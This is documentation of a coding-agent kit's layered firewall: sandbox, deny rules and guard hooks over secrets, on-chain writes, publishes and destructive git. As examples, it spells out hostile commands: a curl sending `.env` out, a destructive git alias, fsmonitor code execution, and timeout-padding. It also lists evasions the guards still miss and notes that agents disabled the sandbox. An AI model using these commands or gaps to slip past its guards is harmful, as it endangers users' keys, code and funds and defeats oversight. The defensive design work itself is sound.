# Permissions, safety gates and firewall tiers

The four tiers — **Off / Relaxed / Medium / High**, default **Relaxed** — and what each one opens and closes are tabulated in the [README](../README.md#firewall-tiers). This document is the mechanism: which gate stops what, how a tier is generated, and what the tiers do **not** do.

The spec the tiers were built from, with the in-session verification behind each rule, is [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md).

## Who enforces what

Four layers enforce the firewall. Three ship in the kit. The fourth is the [safe-ai-skill](https://github.com/solanabr/safe-ai-skill) plugin, a separate Claude Code plugin that the full install and the plugin install both enable. Each layer holds only under its own conditions:

| Layer | What it is | Holds when |
|---|---|---|
| Sandbox | Claude Code's OS sandbox, `sandbox.*` in `.claude/settings.json` | Full install at Relaxed, Medium or High. It covers every process a sandboxed Bash command starts, whatever the command looks like. It does not cover the file tools, an MCP server's process, or a command line led by one of the eight `excludedCommands`. A plugin install has none, because Claude Code drops a plugin's `sandbox` key |
| Permission rule | `permissions.deny` and `permissions.ask` | Full install, in every permission mode, `bypassPermissions` included. A rule matches the literal command or tool form, so a wrapper, a variable or a path-qualified binary walks past it. A plugin install has none, because Claude Code drops a plugin's `permissions` key |
| Kit hook | `secrets-guard.sh`, `onchain-guard.sh`, `egress-guard.sh` and `fetch-exec-guard.sh`, on the Bash tool and `context-mode`'s MCP tools; secrets-guard also on Read and Grep | Full and plugin installs, while hooks are enabled. Each decides per statement on what it can parse. A missing script or an awk failure exits 0, so the call passes. At Off, onchain-guard, egress-guard and fetch-exec-guard return early, after the size cap, onchain-guard's irreversible set and egress-guard's `rm`/`kill` pass; secrets-guard runs in full. A plugin install has no `security.json`, so the tier-varying gates act as at Relaxed |
| safe-ai-skill | The plugin's own PreToolUse, PostToolUse, UserPromptSubmit and SessionStart hooks | While `safe-ai-skill@stbr` is installed and enabled. Its engine ships prebuilt for macOS and glibc Linux (x64, arm64); with no engine for the platform it blocks every call it gates. It does not read the kit's tier, so its verdicts are the same at Off and at High. It runs on every Bash call, on Read, Grep and Glob, on every `mcp__*` tool, on each prompt and at session start |

An `--agents` install has no Claude Code hooks, rules or sandbox; what each other agent enforces is in [other-agents.md](other-agents.md).

A plugin release reaches kit users only when the kit moves that pin. ### What only safe-ai-skill enforces

No kit layer covers these. They hold only while `safe-ai-skill@stbr` is installed and enabled:

- the file tools and `cat`-style reads of the project's `.env` at Off, Relaxed and Medium (High has the kit's own `Read()` deny);
- the Read tool on project keypairs;
- on-chain gating at Off, where onchain-guard asks nothing;
- spend caps and grants;
- value-moving calls on MCP servers other than `context-mode`, such as Helius's `heliusWrite` transfers;
- the `curl … | sh` installer prompt;
- the session-start skill and MCP supply-chain check;
- the pasted-key prompt guard.

**Installing it.** The plugin install pulls it in: `solana-ai-kit@stbr` depends on `safe-ai-skill@stbr`. The full install enables it in `.claude/settings.json` and runs `claude plugin install safe-ai-skill@stbr --scope project`; someone who later clones the project runs that command once. See the [README](../README.md#security-firewall-safe-ai-skill).

**If you disable it** (`"safe-ai-skill@stbr": false` under `enabledPlugins` in `.claude/settings.local.json`), the kit's three layers stay as tabulated and every item in the list above goes. In particular, below High nothing stops the agent reading the project's `.env` with the Read tool.

**Without the kit's sandbox** (Off, or a plugin install), safe-ai-skill is a pattern layer like the kit hooks. Neither stops a script written in one call and run in the next, a path built at runtime or base64-decoded, a subprocess reading a credential file, or egress to a host no pattern names. The sandbox closes those for sandboxed Bash commands only, not for an MCP server's process or a line led by an excluded command.

Where the two engines overlap, both run on the same call, so a command can pass two checks and get two prompts. How the kit and safe-ai-skill should divide the work is an open design discussion in [#264](https://github.com/solanabr/ai-kit/issues/264).

## Permissions and Safety Gates

Edits and commits run without hooks, formatters or extra prompts. The gates sit around secrets, on-chain writes and destructive commands.

| Gate | Where | What happens |
|------|-------|--------------|
| Firewall tier | `.claude/security.json` names it; `/firewall` writes the matching rules into `.claude/settings.json` | Decides how much of the policy below applies, plus which paths are readable and writable. Default: **Relaxed**. A switch lands in the **next** session, not the current one. See [Firewall tiers](../README.md#firewall-tiers) |
| Private keys, wallet vaults, credentials (`~/.ssh`, `~/.config/solana/id.json`, browser wallet storage, `gh auth token`, ...) | `Read` deny rules (also enforced by the sandbox) + PreToolUse hook | Blocked at every tier; the message points to `solana address` or asks the user to run it. The default wallet and the registry and git-host tokens — `~/.npmrc`, `~/.git-credentials`, `~/.netrc`, `~/.aws`, `~/.cargo/credentials*`, `~/.docker/config.json` — are denied at every tier. The one credential file that varies is `gh`'s host file, in the next row |
| The GitHub CLI's host file, `Read(~/.config/gh/hosts.yml)` | deny rule, **Medium and High only** | Blocked to the file tools and, because a `Read` deny reaches the sandbox, to every sandboxed command. Off and Relaxed leave it readable inside the sandbox so `gh` can read its configuration there: the every-tier deny that rule sets before 9 carried stopped `gh` starting there, and agents turned the sandbox off to run it. At every tier the Read and Grep tools are refused on it (next row), `cat` of the file and `gh auth token` stay denied, and secrets-guard refuses a command that reads it; egress-guard refuses one that sends it at every tier but Off. What opening it costs is under *What Relaxed actually guarantees* |
| The `Read` and `Grep` tools on `gh`'s host file, in any spelling that reaches the same file, and a `Grep` whose search root holds it | `secrets-guard.sh` | Blocked at every tier, Off included, so only `gh`'s own process reads the file and its token stays out of the transcript; the message points to `gh auth status`. The file is the one `gh` itself uses: `$GH_CONFIG_DIR/hosts.yml`, else `hosts.yml` under `$XDG_CONFIG_HOME/gh` or `~/.config/gh`. It is matched by device and inode, so `~`, `$HOME` spellings, `..`, a symlink, a hard link and another case on a case-insensitive volume all count, and a `Grep` rooted at the file or at any directory above it — `~/.config/gh`, `~/.config`, your home — is refused, since it would read the file; search a narrower path. context-mode's `ctx_execute_file` and `ctx_index` get the same test on their `path`. Glob is not gated: it returns names, never contents. At Medium and High the deny rule in the row above refuses the same reads first. Existing installs receive the registration on `/update` (hook set 3) |
| `--final`, `solana program close --bypass-warning`, `program-v4 finalize`, `spl-token authorize --disable` | deny rules + PreToolUse hook | Blocked; the user runs them |
| Program deploys, upgrades, buffer writes, `extend`, closes and authority changes; `anchor idl set-authority`; `spl-token transfer`/`authorize`/`approve`; `solana transfer`; stake and vote withdrawals, `close-vote-account`, and the stake, vote and nonce authority changes (`stake-authorize`, `vote-authorize-voter`, `vote-authorize-withdrawer`, their -checked forms, `authorize-nonce-account`). The verb is found behind the CLI's global options too (-u/--url, -k/--keypair, -C/--config, --commitment, attached or separate), and a help or version call directly after the binary or the verb, in a command with no quoting, comment, substitution or redirection, is a read | `onchain-guard.sh` | Approval prompt on every cluster, naming the cluster it resolved (flag, `Anchor.toml` or `solana config`) — except a local validator at Relaxed, which runs without one. Only an exact local host counts as one (`localhost`, `127.0.0.1`, `::1` or `0.0.0.0`, any port, or the CLI's `l`/`localnet`); devnet and testnet are named the same way, by an exact moniker (`d`, `devnet`, `t`, `testnet`) or a known public host (`api.devnet.solana.com`, `devnet.helius-rpc.com`, `api.testnet.solana.com`), never by a word inside the URL. Any other host, or no cluster found at all, is treated as an RPC endpoint that may be mainnet. Every write in a command is judged by its own cluster flag, and the most dangerous one decides. Interactively, mainnet and an unidentified cluster get an approval prompt below High, and High denies mainnet. In a run known to be headless (`claude -p`, the Agent SDK, CI, or `KIT_FIREWALL_HEADLESS=1`), mainnet and an unidentified cluster are denied: at High outright, below it unless `CONFIRM_MAINNET=1`. Devnet, testnet and localnet go silent headless. To recognise another devnet or testnet provider, see *Adding a devnet or testnet RPC provider* below. Where the hook cannot tell (another harness), it prompts rather than denying |
| Fetch-and-execute: `npx`, `npm exec`/`npm x`, `pnpm dlx`, `yarn dlx`, `bunx`, `bun x`, `uvx`, `uv tool run`, `uv run --with`, `pipx run`, `cargo install`, `cargo binstall`, `go run`/`go install` of a versioned package — **only** when the package is not already a declared dependency | `fetch-exec-guard.sh` | Reported at Relaxed and Medium, denied at High. Off is silent. A named set of packages the kit's own commands invoke also passes at High, reported rather than blocked — the list is `KIT_FETCH_EXEC_ALLOW` in `.claude/hooks/fetch-exec-guard.sh`. A nested Claude Code agent launched through a package runner with a policy-weakening flag is denied instead, at every tier but Off — see the nested-`claude` row below |
| `bash .claude/bin/skills.sh list` and `add <id>` (`.agents/bin/` with `--agents`) | allow rules | No prompt, so an agent can install the extension pack it needs. `add` clones the kit and its submodules over the network and installs the pack; each pack is pinned to a commit (submodule or registry `commit`) that moves only through a reviewed PR. `prune`, `select` and `uninstalled` still prompt |
| `bash .claude/bin/decisions.sh` and `bash .claude/bin/report-page.sh` | allow rules | No prompt, at every tier, for the two helpers, listed for the same reason as `skills.sh`: `decisions.sh` keeps the decision record under the repository's git common directory, and `report-page.sh` renders a JSON file as a local HTML page, a decision sheet or a report, with no network request. Each rule names one script path; `bash` itself gains nothing |
| A subagent writing the decision record: `decisions.sh add` or `supersede`, or `Write`, `Edit`, `MultiEdit` or `NotebookEdit` aimed inside the record directory, links resolved | `decisions-guard.sh` | Blocked at every tier, for any call whose payload carries an `agent_id` (a subagent, a workflow's agents included); the main session passes before anything is read. Whatever the record holds reaches every agent as the user's decision, so only the user's session writes it. Other write routes are a documented limit, not a boundary this guard claims: see [`docs/decisions.md`](decisions.md) |
| `solana-keygen new`/`recover` with `--force` and no `-o` (overwrites `~/.config/solana/id.json`) | `secrets-guard.sh` | Blocked at every tier. Without the flag `solana-keygen` refuses to overwrite an existing file on its own, so the message says to drop `--force` or pass `-o <path>`. With `-o` the command is not gated — regenerating a program keypair is ordinary work |
| Force push — `--force`, `--force-with-lease`, `--force-if-includes`, `-f`, and the leading-plus refspec form (`git push origin +main`) no glob can express; `gh pr merge` | `egress-guard.sh` | Relaxed: allowed. Medium: approval prompt. High: blocked. A `--dry-run`/`-n` push is not gated |
| `npm`/`cargo`/`yarn`/`pnpm`/`bun publish` | `egress-guard.sh` | Relaxed: approval prompt; in a run known to be headless, blocked unless `CONFIRM_PUBLISH=1` is set. Medium and High: blocked, headless included, with no escape. `--dry-run` is not gated |
| Recoverable history rewrites — `git rebase`, `git commit --amend`, `git stash drop`/`clear`, `git branch -d`, `git branch -D`/`-f`/`--force`, `git tag -d`/`--delete`, `git filter-branch`/`filter-repo` | `egress-guard.sh` | **High only**: approval prompt. Everything in that list is reflog-recoverable, which is why no lower tier gates it — `git branch -D` and `-f` included, which before rule set 10 every tier denied outright. `git rebase --continue`/`--abort`/`--skip` are exempt, so a conflict resolution is never interrupted |
| `--receive-pack`/`--upload-pack`/`--exec` overrides on `push`, `pull`, `fetch`, `clone`, `ls-remote`; `gh issue delete`, `gh repo delete` | deny rules | Blocked at every tier. The transport flags name a *program* for git to run, and `git push/pull/fetch` are three of the eight `excludedCommands`, so that program would run with the sandbox lifted. The two `gh` subcommands are the ones GitHub cannot undo — from the UI or from the API |
| `git config alias.` — in any spelling, including the --global, --local, --file and --add forms and the newer `git config set alias.` | deny rules | Blocked at every tier. An alias is the one evasion that outlives the command that created it: `git config alias.z '!git clean -fdx'` is an ordinary config write, and the destruction happens later in `git z`, where neither a glob anchored on a subcommand nor a hook classifying subcommands has a verb to match. Ordinary keys — `user.email`, `core.autocrlf` — are untouched, which is why `git config` is not denied whole |
| Writing a `git config` key that makes git run a command later — `alias.*`, `core.pager`, `core.editor`, `core.hooksPath`, `sequence.editor`, `credential.helper`, `diff.external` — in any case spelling, plus `git config --edit` | `egress-guard.sh` | Blocked at every tier but Off, where the egress hook does not run. This is the half of the row above that no glob can express. Git's section and variable names are case-insensitive and a permission glob is not, so `git config Alias.z '!git clean -fdx'` walks past both deny rules — and `alias` alone has 32 case spellings, which is one key of seven. The guard normalises the key instead, covers the `--global`, `--local`, `--system`, `--worktree`, `--file`, `--add` and `--replace-all` forms and the newer `git config set`, and looks past the wrappers in front of git — `env`, `sudo`, `nice`, `timeout`, `stdbuf`, `xargs`, `exec` and `sh -c` among them — including an option that takes a word, short or spaced long (`nice -n 5`, `timeout -s KILL 5`, `timeout --signal KILL 5`, `xargs --max-args 1`, `env -u HOME`), past a reserved word (`if git config …; then`, `! git config …`) and across a backslash-newline continuation (`git config \<newline>core.hooksPath …`). Deny at every tier rather than a ladder: what is stopped is not a destructive act whose blast radius a tier could scale, it is a key that makes git execute an attacker-chosen command at some later, unrelated moment, and no agent workflow needs `core.hooksPath` set on the user's behalf. **Reads are not gated** — `--get`, `--get-all`, `--get-regexp`, `--list` and `-l` are ordinary work, which narrows the deny rules above on purpose — and neither are the removers (`--unset`, `--remove-section`) or any other key, so `user.email`, `core.autocrlf` and `remote.origin.url` stay silent. A shell redirect into `.git/config` is not a `git config` command at all, so no subcommand parsing reaches it; Claude Code's own sandbox refuses the write wherever the sandbox is on, and High denies the file tools the same file — see *Only High stops the file tools writing a repository's git config and hooks* below |
| A destructive git subcommand reached behind a git-level option — `git clean`, `git restore`, `git checkout --`, `git reset --hard`, `git reflog expire`, `git reflog delete`, `git reflog drop`, `git prune`, `git gc --prune`, `git push --mirror`, and the `--upload-pack`/`--receive-pack`/`--exec` transport overrides | `egress-guard.sh` | Blocked at every tier but Off, where the egress hook does not run. Every destructive-git deny is a glob anchored on the literal subcommand, so a git-level option sits where the glob expects `git` and none of them match. `git --help` lists the whole set of them before the subcommand; `git --config-env` and `git --exec-path=` are denied whole, and `git -C` and `git -c` each meet a prefixed twin of each destructive rule (rule sets 10 and 12, see the wrapper note below). Measured against the live rules, `git --git-dir` and the no-pager, pager and pathspec switches all let `clean` through. The guard walks the global options and classifies the subcommand instead — taking the word after the ones that take one, the undocumented `--shallow-file` included, and stopping at the ones after which git runs no subcommand at all (`--help`, `-h`, `--version`, `-v`, the path queries, `--list-cmds=` and a bare `--exec-path`), so `git --help clean`, which is `git help clean`, is not read as a prefixed `clean`. It **mirrors the deny rules and changes no tier's policy**: it fires only on the prefixed spelling, because the unprefixed one is already decided at the permission layer, and each predicate is the rule it mirrors or narrower — `--ha` and `--mirror` are matched as token prefixes where the glob matches the substring anywhere. Mirroring includes the bare form: a trailing ` *` that is a rule's only wildcard matches the command with nothing after it, so the subcommand alone behind a git-level option is blocked too. That matters for `clean`, which deletes untracked files with no `-f` once `clean.requireForce` is false — and `--config-env` sets that inside the same command line. Only the `prune` subcommand is gated, and `gc` only with a token beginning `--prune`: `worktree prune`, `remote prune`, `prune-packed` and `fetch --prune` are other commands, and a plain `gc`, `gc --auto` and `gc --no-prune` are ordinary maintenance, so all of them stay silent — as do the reflog's reads, `show`, `list`, `exists` and a bare `git reflog`, since only the word after `reflog` decides. Out of scope: `git branch -D`/`-f`, which is reflog-recoverable and since rule set 10 denied in no spelling — High asks for it instead, in the recoverable-history row above. Still open: a variable-indirected command (`G=git; $G clean -fd`) and a subcommand the shell builds only after the hook has read the words (`git --no-pager $'clean' -fdx`, `{clean,}`, `${X:-clean}`), git inside a script the agent wrote, git named by path or with its subcommand quoted and nothing in front (`/usr/bin/git clean -fd`, `git 'clean' -fd`) — Claude Code documents that a deny rule matches neither, and with no prefix this guard stays out — and `git checkout <tree-ish> -- <path>`, which the glob does not cover either |
| `git -c` with any value but `core.fsmonitor=false` or `core.hooksPath=/dev/null`, and `git --config-env` reached behind another git-level option | `egress-guard.sh` | Blocked at every tier, Off included: this one pass runs ahead of the egress hook's Off early-exit. `git -c core.fsmonitor=<program> status` is arbitrary code execution and `--config-env` is the same with the value read from an environment variable. Through rule set 12 a `Bash(git -c *)` deny refused every `-c`, which also refused auditor-skill's `git -c core.fsmonitor=false <subcommand>` — the form it uses so an audited checkout's fsmonitor hook cannot run — and no allow can carve an exception out of a deny. Rule set 13 drops that rule and the guard holds the whole `-c` gate, in any position (`git -c …`, `git -C <dir> -c …`, `git --no-pager -c …`): `core.fsmonitor=false` and `core.hooksPath=/dev/null` pass, because each takes a program away, and every other value is blocked — `core.fsmonitor=true`, a path, `core.hooksPath=.git/hooks`, any other key. Taking a program away cuts both ways: `git -c core.hooksPath=/dev/null commit` or `push` also skips the project's own git hooks, a pre-commit secret scanner included, exactly as `--no-verify` does (which the firewall does not deny either), so the allowance does not mean the repository's hooks stay on. After a safe value, every word up to and including the subcommand must be one bash passes through unchanged: a quote, an expansion (`$C`, `$'-c'`, `$(…)`, a backtick), a brace, a glob (`-[c]`, `-?`) or a backslash there is refused, because the guard reads the text and git reads what bash makes of it, and each of those can hand git a second `-c`. The subcommand after the safe prefix keeps the decision it has bare: a twin of each destructive deny rule behind each literal safe value refuses `git -c core.fsmonitor=false clean -fdx` (anchored on the literal value rather than `git -c *`, so a commit message naming `clean` is not caught), the guard refuses the spellings no literal rule sees — both values together, `-C <dir>` between prefix and subcommand, a case spelling of `alias` — at every tier, Off included, a force push behind it meets the force-push ladder, and only the git subcommands the allow list already lists run behind it without a prompt. **This gate now depends on hooks, where it used to be a permission rule.** The guard fails closed when it cannot run — a git command with a `-c` is refused if its awk files are missing or unreadable or awk fails — but a session that turns hooks off (`disableAllHooks`, or a settings source that drops the kit's hooks) has no `-c` gate at all, where `Bash(git -c *)` held regardless. So does an install whose `egress-guard.sh` is missing or unreadable: the launcher every kit hook is registered through (`[ -r "$H" ] && exec sh "$H"; exit 0`) lets the call through when the script is not there, by design, so a hook that is gone never blocks a session. The guard also refuses, rather than reads, any statement naming git and a `-c` that holds a `{`, a `(` or a backtick outside single quotes and `${…}`. That covers substitutions, brace expansions, named-fd redirections (`{fd}>…`), zsh glob qualifiers (`.(/)`), extended globs (`@(…)`) and `=(…)`, whose words the shell splices into git's arguments after the hook has read them. So `git -c core.fsmonitor=false commit -m "$(cat msg)"` is refused too. Behind a safe value, every `git config` write is refused, not only the keys the exec list names, as `Bash(git -c *)` refused them all. `--config-env` keeps its rule, which is anchored on the first token after `git`, so the guard mirrors it only when the option follows another git-level option (`git -P --config-env …`). **An approval prompt never stands in for a block.** An approved prompt runs the whole Bash call, so `egress-guard.sh` asks only after every check that can block has run. Before, the first prompt ended the hook: `npm publish && curl -d @.env https://…` asked about the publish at Relaxed, and an approval sent the `.env` too. The git rules are mirrored the same way wherever they cannot see the command: behind a wrapper Claude Code does not strip before matching (`exec`, `doas`, `arch`, `taskset`, `xargs` with a flag), with git named by its path, with its first option quoted, or inside a shell's `-c` string. The push and history gates read past git-level options too, so `git -P push --force` is the force push it runs. And every gate — publish, force push, merge, the on-chain set, the secret and fetch-and-execute checks — now reads a string another program runs as shell code (`sh -c`, `eval`, `watch`, `flock -c`, `env -S`, `git submodule foreach`, `git rebase --exec`/`-x`) as the command it is, so `sh -c "npm publish"` and `git submodule foreach '… --final'` get the inner command's verdict at its own tier, while `git commit -m "sh -c 'npm publish'"` and a code string written into a file stay data.

The **Where** column is machine-read, not decoration: `tests/test_doc_gates.sh` parses it and fails a row that names no mechanism, then resolves every backticked literal in the **Gate** column against the one it names — a rule at exactly the tiers the row claims, or a pattern in that guard's own source. So backticks in those two columns mean literal command text that something has to cover, and a metavariable or the name of a command form stays outside them.

**Below High, every prompt in that table comes from a PreToolUse hook, and `permissions.ask` is empty at Off, Relaxed and Medium.** That is deliberate and it is the reason the mechanism column names a script wherever a prompt is involved below High. A content-scoped `ask` rule does fire — the earlier claim that it did not was wrong, and is corrected in [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §1.1 — but an `ask` under `claude -p` is a hard *failure* rather than a pause, and no permission rule can decide not to prompt when there is nobody to prompt. A hook can: `kit_ask` goes silent with no interactive user, which is what lets Relaxed gate a force push or a devnet deploy and still be the tier you run headless. The irreversible set does the opposite and denies rather than going quiet, so "nobody is watching" never becomes a free pass: a mainnet write, an on-chain write to a cluster the hook cannot identify, and a publish. `CONFIRM_MAINNET=1` and `CONFIRM_PUBLISH=1` are the deliberate escapes, at Relaxed and Medium for the on-chain pair and at Relaxed for a publish. How a hook knows it is headless is under *High is interactive-only; Relaxed is the tier for CI*. Hard blocks are a `deny` rule or a hook `exit 2`. High is the exception, with two ask rules (`ASK_HIGH` in `firewall.sh`), before a workflow starts and before a command is retried outside the sandbox: High is interactive-only, so an ask there pauses rather than fails, and Claude Code enforces an explicit ask rule in every permission mode, `bypassPermissions` included. The gate table's mechanism column names the rule wherever one of them is the prompt.

Where a gate varies by tier it is a hook for the same reason the deny set does not vary: `deny` is merge-monotonic, so a rule that reaches a user or managed settings file cannot be taken back on the way down. The exceptions in the table are `gh api`, `gh`'s host file, the process-kill and container-removal rules and `bash -c`, all at Medium and High, and they are safe only because `/firewall` owns one file and subtracts exactly the rule strings it recorded — see *How a tier is expressed* below.

**A wrapper in front of a gated command gets the bare command's decision.** The wrappers a permission glob cannot see past — `env`, `sh -c`, `bash -lc`, `zsh -c`, `git --config-env`, `git --exec-path=`, `flock`, `sudo` and the rest — are denied as whole binaries at every tier, because a rule matching `solana program deploy` never sees it behind `env`. Two forms left that list in rule set 10, each for a narrower gate in its place: `bash -c`, whose rule now holds at Medium and High while secrets-guard refuses an agent's own `bash -c` at every tier (below), and `git -C`, further down. `git -c` left it in rule set 13 for the guard in the gate table above, which lets its two program-removing values through.

**`bash -c` has a rule at Medium and High only, so memsearch's recall runs below them.** memsearch's memory-recall skill derives its collection with one `bash -c` line in its own `SKILL.md`, and a deny rule that matches a skill's set-up line aborts the whole skill, so an every-tier `Bash(bash -c *)` stopped recall at every tier. Rule set 10 keeps that rule at Medium and High, where recall still stops, and drops it at Off and Relaxed, where recall runs. What that opens: at Off and Relaxed, Claude Code checks a skill's set-up line against permission rules only, so a skill's set-up line may run `bash -c` — any installed skill's, not only memsearch's. The agent's own commands are a different path: secrets-guard denies every shell `-c` on the Bash tool and `context-mode`'s MCP tools, at every tier, Off included, and lets memsearch's exact line through only when it matches whole. For an agent's `bash -c` at Off and Relaxed, and for every shell `-c` in a plugin install, which carries no permission rules, that hook is the only layer; elsewhere it is the second. `sh -c`, `bash -lc` and `zsh -c` keep their rules at every tier, since memsearch needs `bash -c` alone.

**`git -C` is narrowed to its destructive forms.** It only changes directory, so `git -C <dir> X` is exactly as dangerous as `cd <dir> && git X`, which is allowed — but every destructive git deny is a glob anchored on the literal subcommand, so a `git -C <dir>` prefix sits in front and none of them match. Through rule set 9 that was answered with a blanket `Bash(git -C *)`, which also refused every `git -C <dir> status`, `log` and `diff` and was the largest single source of denials at Relaxed. Rule set 10 replaces it with a `-C`-prefixed twin of each destructive rule — the transport overrides, `--config-env`, `--exec-path=` and `config alias.` included, and `-c` until rule set 13 handed it to the guard — so `git -C . clean -xdf` and `git -C . reflog expire --expire=now --all` are denied at every tier while `git -C . log` runs. The twins hold at every tier for the reason the originals do: [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §3.4 singles out `reflog expire` as deny-at-every-tier because it is what makes history unrecoverable. One false positive comes with them: a destructive verb standing as its own word later in a `-C` command, inside a commit message say, is denied too, and `cd` first is the way round it.

**`-C` was never the only such door** — `git --help` lists the whole set before the subcommand, and the ones that pass through to it — `--no-pager`, `-p`, `-P`, `--bare`, `--git-dir`, `--work-tree`, `--namespace`, the `--no-*` switches and the undocumented `--literal-pathspecs` family — each accept both `--opt=v` and `--opt v` and repeat and combine freely, so there is no glob set to enumerate. That is what the gate-table row above covers: `egress-guard.sh` now walks the global options and classifies the subcommand. `--config-env` passes through too, but it is `-c` reading its value from an environment variable, so since rule set 7 it is denied by `Bash(git --config-env*)` — one rule for both of its spellings, `--config-env=<k>=<v>` and the spaced one, because a `*` touching the option name may be empty and matches `=` as readily as a space, where a ` *` would have required the space. Behind another option it slips its rule the same way the subcommands do, which is the gate-table row after it. The `git --config-env` and `git --exec-path=` denies and the `-C` and `-c` twins stay regardless — they decide at the permission layer, ahead of the hook, they hold at Off, where most of the hook does not run, and a hook miss is a silent open door where a glob is a loud closed one. `git -c` itself is the one exception, made in rule set 13 for a reason no glob could meet: the rule refused `-c core.fsmonitor=false`, which an auditor adds to take a program away, and no allow can carve an exception out of a deny. Its guard runs at Off too. The wrappers the matcher *does* decompose (`nohup`, `time`, `nice`, `timeout`, `stdbuf`, `command`, bare `xargs`) still reach the hooks with the wrapper attached, so the on-chain hook normalises each statement before matching: leading `VAR=value` assignments are kept (the cluster is resolved out of `ANCHOR_PROVIDER_URL=`), wrapper binaries and their own options are dropped, and whitespace runs collapse. Without that, every wrapped form was silent — no cluster warning, and no `exit 2` on the irreversible set the hook is the only guard for. The same holds for the rest of what the matcher reads through: a reserved word leading a statement (`if true; then …`, `! …`, `while … do`, `{ …; }`) is dropped where the statement starts in code rather than inside a quoted argument, and a backslash-newline continuation is joined first, as the shell joins it. Until then `if true; then anchor deploy --provider.cluster mainnet; fi` was silent at every tier and `solana program \<newline>set-upgrade-authority PID --final` passed, and every guard had the same two blind spots. The command word is likewise the one bash looks up: a redirection in front of it is skipped (`2>/dev/null anchor deploy …`), and quotes or backslashes are removed from it and from every other word that holds no blank (`"npm" publish`, `npm "publish"`, `git push '--force'`), so a quoted commit message stays the prose it is. For the same reason the allow list carries no `xargs *` or `command *` glob: only `command -v` and `xargs` feeding `grep`/`rg`/`wc`/`ls` run without a prompt.

**A command too large for the guards to read in time is refused.** Every guard runs with a 10-second timeout, and a hook that times out does not block the call, so padding a command would otherwise walk it past every gate only a hook enforces: on the previous release, an `echo` carrying 234 KB ahead of a mainnet `anchor deploy` kept `onchain-guard` busy for 18 s, and `Bash(anchor *)` is in the allow list. So at every tier, Off included, a Bash command past 32 KB is refused when its code passes 32 KB, when it passes 10,000 lines, or when it passes 256 KB in all. A heredoc body written to a file by a bare `cat` or `tee` with a quoted delimiter (`cat > f <<'EOF'`) is copied rather than parsed, so it does not count as code, and a 200 KB file written that way passes. A body fed to a shell or an interpreter, behind a wrapper, piped on, or one that runs a `$( … )` counts, and so does a PR body passed as `--body "$(cat <<'EOF' …)"`. For the same reason a command whose code strings — `sh -c`, `eval`, `watch`, `flock -c`, `env -S`, `git submodule foreach`, `git rebase --exec` — nest more than three deep, or number more than 2,048 or hold more statements than that, is refused at every tier the guard runs at, rather than read in part. Large files are better written with the Write tool, a long PR body or commit message passed as a file (`gh pr create --body-file`, `git commit -F`), and a long script saved to a file and run. MCP payloads have their own 32 KB cap.

Text that merely *mentions* a gated command or a credential path is not a command. Every hook reads a heredoc body as data — a file being written, a PR body, a commit message — unless something runs it: a shell or interpreter reading it as its program (`bash <<'EOF'`, `python3 - <<'EOF'`), down a pipe (`cat <<'EOF' | sh`) or through `bash -c "$(cat <<'EOF' …)"`, whether or not the delimiter is quoted. An unquoted body's `$( … )` and backticks run while the body is written, so those count as commands too. For an interpreter, what counts is a shell-out in its code (`os.system("curl …")`); the program's own network calls are not read. The secrets hook decides on a tokenized command — `echo`/`printf` arguments, `grep`/`rg` patterns and `git`/`gh` messages are data, and a metadata-only command (`ls`, `stat`, `shasum`) on a protected path is not a read of it. The on-chain hook anchors its match to the start of a statement, which is weaker: a quoted argument whose text after a `;` or a line break begins with a gated verb (`git commit -m "…; anchor deploy …"`) still prompts.

**Downloading a package and running it is gated by hook, for the same reason publishing is.** `npx tsc --noEmit` runs the TypeScript this project installed; `npx -y create-solana-dapp` runs a stranger off the network. Both are `Bash(npx *)`, which is in `permissions.allow`. A permission rule cannot separate them — it sees a glob, not a `package.json`, and it cannot vary by tier — and `deny Bash(npx *)` would be close to decorative, since `npm exec`, `npm x`, `pnpm dlx`, `yarn dlx`, `bunx`, `bun x`, `uvx` and `/opt/homebrew/bin/npx` are each a different command word. So the hook reads the command, looks the package up in `package.json` plus `node_modules/.bin/` (`Cargo.toml`/`Cargo.lock`, `go.mod`, `pyproject.toml` for the other ecosystems), and decides: **anything already declared passes at every tier**, and everything else is reported at Relaxed and Medium and denied at High. This is also the only route by which `cargo install` can be gated at High at all, because `Bash(cargo install *)` is allowed at every tier and a `deny` rule cannot vary — it stays in the allow list, because a `PreToolUse` hook decides before the permission layer and over it. Commands that only build or run local code (`cargo build`, `cargo run`, `cargo install --path .`, `go build`, `go run ./...`, `pnpm exec`, `npm run`, `npx --no-install`) are not gated, and neither is a project with the package already installed. Two honest limits: a project with no manifest at all declares nothing, so every fetch there is reported; and `pnpm dlx <your-own-tool>` passes on the dependency check even though `dlx` fetches regardless.

**High also passes the packages the kit's own commands invoke, and the list is readable.** Without that, High would deny the product shipping it: `/scaffold` *is* `npx create-solana-dapp`, `/generate-idl-client` *is* `npx codama` plus `cargo install shank-cli`, and `/doctor`'s only fix for a missing Anchor is `cargo install --git https://github.com/solana-foundation/anchor avm` — a `--git` form no project can ever declare its way out of, since a git source is gated whatever the manifests say. A gate that blocks the documented workflow gets switched off, so those pass; every other stranger stays denied. The list is `KIT_FETCH_EXEC_ALLOW` near the end of [`.claude/hooks/fetch-exec-guard.sh`](../.claude/hooks/fetch-exec-guard.sh), eight entries at the time of writing: `create-solana-dapp`, `create-next-app`, `codama`, `solana-mobile`, `@colosseum-org/copilot-connect` and `@stbr/safe-ai-skill` on npm, `shank-cli` on crates.io, and `avm` from Anchor's own git repository. It lives in the guard rather than in `settings.json` because `/update` copies `hooks/` and (issue #91) does not rewrite `settings.json`, so a list there would reach fresh installs only.

Three properties of that list worth stating, because an allowlist is the part of a gate most likely to be quietly widened. It is **matched on the exact package name within one ecosystem**, never as a prefix or a substring: `@stbr/safe-ai-skill` admits neither `@stbr/safe-ai-skill-evil`, nor the rest of the `@stbr` scope, nor `@other/safe-ai-skill`, and the crates.io `shank-cli` entry does not admit `npx shank-cli`. It changes **High only** — Relaxed and Medium still report an allowlisted fetch exactly as they report any other, and Off stays silent, so no entry can make a fetch less visible at any tier. And an allowlisted package at High is **reported, not silently run**: the note names the package and the list it was found on, so the fetch is still in the transcript and the reason it was not denied is in it too. `tests/test_fetch_exec_guard.sh` asserts each of the three, with a near-miss of every entry and two mutation checks that prove the near-miss assertions can fail.

